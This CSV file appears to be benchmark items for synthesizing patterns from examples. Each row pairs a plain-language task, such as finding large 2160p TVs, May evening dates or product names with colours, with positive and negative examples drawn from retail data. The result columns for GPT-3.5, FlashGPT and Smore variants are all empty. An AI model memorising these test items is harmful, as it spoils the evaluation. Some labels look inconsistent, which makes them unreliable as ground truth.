bid,database,table,column,task,train-positive,train-negative,test-positive,test-negative,GPT-3.5-exec-precision,GPT-3.5-exec-recall,GPT-3-exec-precision,GPT-3-exec-recall,FlashGPT-precision,FlashGPT-recall,FlashGPT-program,FlashGPT-time,FlashGPT-#ex,GPT-3.5-regex-precision,GPT-3.5-regex-recall,GPT-3.5-regex-program,GPT-3.5-regex-time,GPT-3.5-regex-#sample,GPT-3.5-synth-precision,GPT-3.5-synth-recall,GPT-3.5-synth-time,GPT-3.5-synth-program,GPT-3.5-synth-#sample,GPT-3-synth-precision,GPT-3-synth-recall,GPT-3-synth-time,GPT-3-synth-program,Smore-precision,Smore-recall,Smore-program,Smore-time,Smore-no-type-precision,Smore-no-type-recall,Smore-no-type-program,Smore-no-type-time,Smore-no-type-system-precision,Smore-no-type-system-recall,Smore-no-type-system-program,Smore-no-type-system-time,Smore-no-decomp-precision,Smore-no-decomp-recall,Smore-no-decomp-program,Smore-no-decomp-time,Smore-no-repair-precision,Smore-no-repair-recall,Smore-no-repair-program,Smore-no-repair-time,Smore-no-repair-#sample,Smore-no-sketch-precision,Smore-no-sketch-recall,Smore-no-sketch-program,Smore-no-sketch-time
11,plugs-electronics,hands_on_lab_data,Product Name,All TV that is > 42' and >= 2160P,"233-43"" Class (42.5"" Diag.)   LED   2160p
842-49"" Class (48.5"" Diag.)   OLED   2160p
10-60"" Class (60"" Diag.)   LED   2160p","451-48"" Class (47.6"" Diag.)   LED   1080p
11-40"" Class (40"" Diag.)   LED   2160p
230-50"" Class (49.5 Diag.)   LED   1080p","454-65"" Class (64.5"" Diag.)   LED   2160p
1-60"" Class (59.5"" Diag.)   LED   2160p
208-65"" Class (64.5"" Diag.)   LED Curved   2160p
804-55"" Class (54.6"" Diag.)   LED   2160p
834-65"" Class (64.5"" Diag.)   OLED   2160p
9-55"" Class (54.6"" Diag.)   LED   2160p
459-60"" Class (60"" Diag.)   LED   2160p
47-55"" Class (54.6"" Diag.)   OLED   2160p
841-75"" Class (74.5"" Diag.)   2160p   Smart
828-65"" Class (64.5"" Diag.)   2160p   Smart","201-55"" Class (54.6"" Diag.)   OLED   Curved
450-39"" Class (38.5"" Diag.)   LED   720p
806-40"" Class (40"" Diag.)   LED   1080p
232-E Series 32"" Class (32"" Diag.)   LED
468-32"" Class (31.5"" Diag.)   LED   1080p
460-48"" Class (47.6"" Diag.)   LED   1080p
235-50"" Class (49.5"" Diag.)   LED   1080p
472-24"" Class (23.8"" Diag.)   LED   1080p
816-40"" Class (40"" Diag.)   LED   1080p
632-21.5"" LED HD Monitor   Glossy Black",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
12,plugs-electronics,hands_on_lab_data,Product Name,All TV that is <50' or with <=1080P,"232-E Series 32"" Class (32"" Diag.)   LED 2160p
4-50"" Class (49.5"" Diag.)   LED   2160p
825-32"" Class (31.5"" Diag.)   LED   1080p","227-65"" Class (64.5"" Diag.)   LED   1080p
2-65"" Class (64.5"" Diag.)   LED   2160p
245-AQUOS   70"" Class (69.5"" Diag.)   LED","824-E Series   24"" Class (23"" Diag.)
820-43"" Class (42.6"" Diag.)   LED   1080p
220-48"" Class (47 5/8"" Diag.)   LED
472-24"" Class (23.8"" Diag.)   LED   1080p
223-50"" Class (49.7"" Diag.)   LED   2160p
235-50"" Class (49.5"" Diag.)   LED   1080p
233-43"" Class (42.5"" Diag.)   LED   2160p
226-48"" Class (47.6"" Diag.)   LED   2160p
476-24"" Class (23 5/8"" Diag.)   LED
239-AQUOS   43"" Class (42.5"" Diag.)   LED","802-60"" Class (59.5"" Diag.)   LED   2160p
215-88"" Class (88"" Diag.)   LED   Curved
614-21.5IPS LED HD Monitor   Black
817-55"" Class (54.6"" Diag.)   LED   2160p
835-55"" Class (54.6"" Diag.)   LED   2160p
217-55"" Class (54 5/8"" Diag.)   LED
231-AQUOS   55"" Class (54.6"" Diag.)   LED
475-60"" Class (59.5"" Diag.)   LED   2160p
208-65"" Class (64.5"" Diag.)   LED Curved   2160p
243-55"" Class (54.6"" Diag.)   LED   2160p",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
13,plugs-electronics,hands_on_lab_data,Date,Find purchase date that occurs in evening of May,"2019-05-01 18:00:28
2020-05-04 23:43:05
2020-05-24 00:39:21","2020-05-31 11:59:09
2020-06-01 22:26:21
2019-04-30 19:02:14","2022-05-25 20:02:42
2021-05-26 19:55:27
2019-05-16 18:56:00
2021-05-08 22:20:06
2020-05-31 23:47:43
2021-05-20 00:29:23
2022-05-19 23:26:56
2019-05-28 00:55:11
2021-05-31 20:12:46
2020-05-09 00:37:22","2020-07-17 07:55:30
2019-08-21 16:44:45
2021-05-10 10:44:30
2019-09-03 19:10:38
2020-10-15 06:34:25
2020-07-08 06:14:27
2019-07-23 17:48:31
2020-07-12 06:29:41
2021-12-07 03:57:04
2020-05-20 07:36:05
2020-04-17 10:09:24",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
14,plugs-electronics,d_store,Monthly Rent Cost,Find rent >=10k,"10000
10700
11300","9400
1400
1600","10600
10400
11400
11500
11200
10200
11100
10900
11000
10300","7600
4000
4600
2000
5000
7000
9000
5100
9700
2000",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
15,retail,GA,Hits page pagetitle,string of the format string | string | string,"Google Products | Shop by Brand | Google Merchandise Store - https://shop.googlemerchandisestore.com/Google+Redesign/Shop+by+Brand/Google
Âm thanh | Điện tử | Cửa Hàng Google Merchandise
Canecas & copos | Drinkware | Loja de Mercadoria do Google","Подарочные карты | Магазин Google Merchandise
14: Electronics | Google Merchandise Store
Bags | Google Merchandise Store","Accesorios | Electrónica | Google tienda de artículos
YouTube | Магазин по бренду | Google Магазин продукції
Adhesivas | Accesorios | Google tienda de artículos
Audio | Electronics | Google Merchandise Store - https://shop.googlemerchandisestore.com/
Аудио | Электроника | Google Магазин продукции
Svítilny | Electronics | Merchandise obchod Google
Головные Уборы | Одежда Товаров Магазин | Google
Android | Comprar por marca | Google Merchandise Store
Headgear | Apparel | Google Merchandise Store - https://shop.googlemerchandisestore.com/Google+Redesign/Apparel/Headgear
Männer T-Shirts | Bekleidung | Google Merchandise Store","Google Flashlight - https://shop.googlemerchandisestore.com/Google+Redesign/Electronics/Accessories/Google+Flashlight.axd
Google Women's Short Sleeve Performance Tee Black - https://shop.googlemerchandisestore.com/Google+Redesign/Apparel/Women+s+Google+Short+Sleeve+Performance+Tee+Black.axd
The Google Merchandise Store/Compact Selfie Stick
Oficina | Google Merchandise Store
Dárkové karty | Merchandise Store Google
女裝| Google商品商店
服裝| Google商品商店
The Google Merchandise Store/Blue Metallic Textured Spiral Notebook Set
The Google Merchandise Store/Android 24 oz Contigo Addison
The Google Merchandise Store/BRIGHTtravels Seat Pack Organizer - https://shop.googlemerchandisestore.com/Google+Redesign/Bags/Totes/BRIGHTtravels+Seat+Pack+Organzier.axd",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
16,retail,GA,Hits page pagetitle,string of the format string - url,"Google Kick Ball - https://shop.googlemerchandisestore.com/Google+Redesign/Lifestyle/Fun/Google+Kick+Ball.axd
Shop by Brand - https://shop.googlemerchandisestore.com/store.html?cid=42067&vid=20160512512&tpt=theme1_en&mpv=childItemsDTO&mpvp=6
Nest-USA - https://shop.googlemerchandisestore.com/Google+Redesign/Nest/Nest-usa","Notebooks & Journals | Office | Google Merchandise Store https://shop.googlemerchandisestore.com/Google+Redesign/Office/Notebooks++Journals
Youth | Kids' Apparel | Google Merchandise Store https://shop.googlemerchandisestore.com/Google+Redesign/Apparel/Kid+s/Kid+s+Youth
https://shop.googlemerchandisestore.com/?ci=%7Bifdbm:%7Bcampaignid%7D%7D","Shop by Brand - https://shop.googlemerchandisestore.com/store.html?cid=42067&vid=20160512512&tpt=theme1_en&mpv=childItemsDTO&mpvp=4
Google - https://shop.googlemerchandisestore.com/Google+Redesign/Shop+by+Brand/Google
The Google Merchandise Store/Malibu Sunglasses - https://shop.googlemerchandisestore.com/Google+Redesign/Lifestyle/Fun/Malibu+Sunglasses.axd
Google Women's Short Sleeve Badge Tee Grey - https://shop.googlemerchandisestore.com/Google+Redesign/Apparel/Women+s/Women+s+T+Shirts/Google+Womens+Short+Sleeve+Badge+Tee.axd
Lifestyle - https://shop.googlemerchandisestore.com/Google+Redesign/Lifestyle
Google Women's Short Sleeve Performance Tee Black - https://shop.googlemerchandisestore.com/Google+Redesign/Apparel/Women+s+Google+Short+Sleeve+Performance+Tee+Black.axd
BRIGHTtravels Seat Pack Organizer - https://shop.googlemerchandisestore.com/Google+Redesign/Bags/Totes/BRIGHTtravels+Seat+Pack+Organzier.axd
Google 2200mAh Micro Charger - https://shop.googlemerchandisestore.com/Google+Redesign/Electronics/Google+Micro+Charger.axd
Micro Wireless Earbud - https://shop.googlemerchandisestore.com/Google+Redesign/Electronics/Audio/Micro+Wireless+Earbud.axd
Google Flashlight - https://shop.googlemerchandisestore.com/Google+Redesign/Electronics/Accessories/Google+Flashlight.axd","Water Bottles & Tumblers | Drinkwa
YouTube | Shop by Brand | Google Merchandise Store -https://shop.googlemerchandisestore.com/Google+Redesign/Shop+by+Brand/YouTube
Flashlights | Electronics | Google Merchandise Store - https://shop.googlemerchandisestore.com/Google+Redesign/electronics/flashlights
Android | Shop by Brand | Google Merchandise
Google | Shop by Brand | Google Merchandise Store |url:[https://shop.googlemerchandisestore.com/Google+Redesign/Shop+by+Brand/Google]
Audio | Electronics | Google Merchandise Store - https://shop.googlemerchandisestore.com/Google+Redesign/Electronics/Audio
Men's T-Shirts | Apparel | Google Merchandise Store - https://shop.googlemerchandisestore.com/Google+Redesign/Apparel/Men++s/Men++s+T+Shirts
Google Men's Bike Short Sleeve Tee Charcoal |url:[https://shop.googlemerchandisestore.com/Google+Redesign/Apparel/Mens+Tshirts/Google+Mens+Bike+Short+Tee+Charcoal.axd]
Home|https://shop.googlemerchandisestore.com/?utm_source=Partners&utm_medium=affiliate&utm_campaign=Data%20Share%20Promo
7 Men's Performance Wear | Apparel | Google Merchandise Store",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
17,retail,STOCK,Description,product with certain measurement,"BAG 125 g SWIRLY MARBLES
VINTAGE FOLDING RULER 2 M
BLACK CHRISTMAS TREE 30 CM","VANILLA INCENSE 40 CONES IN TIN
SEWING SUSAN 21 NEEDLE SET
MAGNETS PACK OF 4 VINTAGE LABELS ","BLACK GEMSTONE NECKLACE 45 CM
GREEN GOOSE FEATHER TREE 60 CM
BLACK CHRISTMAS TREE 120 CM
ESSENTIAL BALM 3.5 g TIN IN ENVELOPE
BLACK CHRISTMAS TREE 60 CM
POLYESTER FILLER PAD 40x40 cm
DIAMOND LAS VEGAS NECKLACE 45 CM
DUSTY PINK CHRISTMAS TREE 30 CM
WHITE GOOSE FEATHER TREE 60 CM 
ZINC FINISH 15 CM PLANTER POTS","PAPER LANTERN 7 POINT SNOW STAR
BLUE POLKADOT PASSPORT COVER
HAIRCLIPS FORTIES FABRIC ASSORTED
VINTAGE KEEPSAKE BOX PARIS DAYS
BLUE HARMONICA IN BOX 
SET 20 NAPKINS FAIRY CAKES DESIGN 
WOODEN TREE CHRISTMAS SCANDINAVIAN
PAPER LANTERN 9 POINT HOLLY STAR L
BLUE SPOT CERAMIC DRAWER KNOB
LUNCH BAG DOILEY PATTERN ",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
18,retail,STOCK,Description,product of set at least 6,"SET OF 6 KASHMIR FOLKART BAUBLES
SET 12 TAPER CANDLES
SET 20 NAPKINS FAIRY CAKES DESIGN ","SET OF 2 ROUND TINS DUTCH CHEESE
SET 4 GARDEN ROSE DINNER CANDLE
ZINC TOP  2 DOOR WOODEN SHELF","SET 36 COLOUR PENCILS LOVE LONDON
ORANGE SCENTED SET 9 T-LIGHTS
SET OF 12 T-LIGHTS VINTAGE DOILEY
SET 6 BLACK BIRD T-LIGHT CANDLES
SET OF 6 NATIVITY MAGNETS 
SET 12 TAPER CANDLES
SET OF 36 PAISLEY FLOWER DOILIES
SET OF 6 SNACK LOAF BAKING CASES
SET OF 72 GREEN PAPER DOILIES
SET 12 COLOUR PENCILS LOVE LONDON
SET 20 RED RETROSPOT PAPER NAPKINS ","60 TEATIME FAIRY CAKE CASES
PAPER CHAIN KIT VINTAGE CHRISTMAS
NOVELTY BISCUITS CAKE STAND 3 TIER
PACK 20 ENGLISH ROSE PAPER NAPKINS
SET OF 4 KNICK KNACK TINS LEAF
PACK OF 12 50'S CHRISTMAS TISSUES
PINK VINTAGE PAISLEY PICNIC BAG
GROW YOUR OWN HERBS SET OF 3
SET OF 3 GOLD FLYING DUCKS
SET 3 OCEAN SCENT CANDLE JEWEL BOX
RED RETROSPOT ROUND CAKE TINS
PARTY PIZZA DISH RED RETROSPOT",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
19,retail,STOCK,Description,product with colors,"GREEN/BLUE FLOWER DESIGN BIG MUG
FELTCRAFT HAIRBAND PINK/PURPLE
BLUE AND PINK ROSE PATCH PURSE","SET/6 FROG PRINCE T-LIGHT CANDLES
PLAYING CARDS JUBILEE UNION JACK
EASTER DECORATION HANGING BUNNY","RED/CREAM STRIPE CUSHION COVER 
WHITE/RED FOLDING UMBRELLA POLKADOT
RED/WHITE FOLDING UMBRELLA POLKADOT
PINK AND WHITE CHRISTMAS TREE 120CM
3 TIER CAKE TIN GREEN AND CREAM
CREAM AND PINK FLOWERS PONY 
PINK/PURPLE RETRO RADIO
PINK/YELLOW FLOWERS HANDBAG
WHITE AND BLUE CERAMIC OIL BURNER
BLACK/WHITE NECKLACE W TASSEL","TRAVEL CARD WALLET UNION JACK
SET/4 BUTTERFLY MIRROR MAGNETS
MAGIC DRAWING SLATE DOLLY GIRL 
60 TEATIME FAIRY CAKE CASES
STORAGE TIN VINTAGE LEAF
GIFT BAG PSYCHEDELIC APPLES
SET OF 6 TEA TIME BAKING CASES
6 RIBBONS ELEGANT CHRISTMAS 
HANGING WOOD AND FELT FLOWER
SET 3 RETROSPOT TEA,COFFEE,SUGAR",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
20,retail,STOCK,Description,start with color and end with jewlery name,"PINK SWEETHEART BRACELET
WHITE FRANGIPANI NECKLACE
PINK VINTAGE VICTORIAN EARRINGS","VINTAGE ENAMEL & CRYSTAL EARRINGS
WHITE STITCHED WALL CLOCK
TABLECLOTH RED APPLES DESIGN ","WHITE GLASS CHUNKY CHARM BRACELET
RED KUKUI COCONUT SEED NECKLACE
RED ENAMEL FLOWER RING
PINK BOUDICCA LARGE BRACELET
BLACK ENAMEL FLOWER RING
BLACK DIAMANTE EXPANDABLE RING
PURPLE SWEETHEART BRACELET
MIDNIGHT BLUE DROP CRYSTAL NECKLACE
TURQ+RED BOUDICCA LARGE BRACELET
BLACK VINTAGE  CRYSTAL EARRINGS","WRAP PINK FAIRY CAKES 
FOOD CONTAINER SET 3 LOVE HEART 
5 STRAND GLASS NECKLACE CRYSTAL
SET/3 RED GINGHAM ROSE STORAGE BOX
BLUE PAISLEY NOTEBOOK
SINGLE ANTIQUE ROSE HOOK IVORY
PORCELAIN ROSE LARGE 
BATHROOM SET LOVE HEART DESIGN
PACK 6 HEART/ICE-CREAM PATCHES
BLUE STONES ON WIRE FOR CANDLE",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
